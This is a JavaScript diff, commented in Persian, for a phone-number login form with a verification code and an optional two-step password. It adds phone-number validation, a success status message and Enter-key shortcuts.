@@ -9,6 +9,12 @@ document.getElementById("sendPhone").onclick = async () => {
     return;
   }
 
+  // اعتبارسنجی شماره تلفن
+  if (!isValidPhoneNumber(phone)) {
+    showStatus("لطفاً شماره تلفن معتبر وارد کنید (مثال: +989123456789)", "error");
+    return;
+  }
+
   currentPhone = phone;
   showStatus("در حال ارسال کد...", "loading");
   
@@ -61,6 +67,11 @@ document.getElementById("sendCode").onclick = async () => {
     if (data.success) {
       showStatus(data.message, "success");
       document.getElementById("codeSection").style.display = "none";
+      
+      // ریدایرکت بعد از ورود موفق
+      setTimeout(() => {
+        showStatus("شما با موفقیت وارد شدید! در حال انتقال...", "success");
+      }, 2000);
     } else if (data.needPassword) {
       showStatus(data.message, "info");
       // اگر نیاز به رمز دومرحله‌ای باشد
@@ -99,6 +110,11 @@ async function checkPassword(password) {
     if (data.success) {
       showStatus(data.message, "success");
       document.getElementById("codeSection").style.display = "none";
+      
+      // ریدایرکت بعد از ورود موفق
+      setTimeout(() => {
+        showStatus("شما با موفقیت وارد شدید! در حال انتقال...", "success");
+      }, 2000);
     } else {
       showStatus(data.message, "error");
     }
@@ -130,3 +146,24 @@ function showStatus(message, type = "info") {
       break;
   }
 }
+
+// تابع برای اعتبارسنجی شماره تلفن
+function isValidPhoneNumber(phone) {
+  const regex = /^\+[1-9]\d{1,14}$/;
+  return regex.test(phone);
+}
+
+// فعال کردن دکمه با کلید Enter
+document.getElementById("phone").addEventListener("keypress", function(event) {
+  if (event.key === "Enter") {
+    event.preventDefault();
+    document.getElementById("sendPhone").click();
+  }
+});
+
+document.getElementById("code").addEventListener("keypress", function(event) {
+  if (event.key === "Enter") {
+    event.preventDefault();
+    document.getElementById("sendCode").click();
+  }
+});
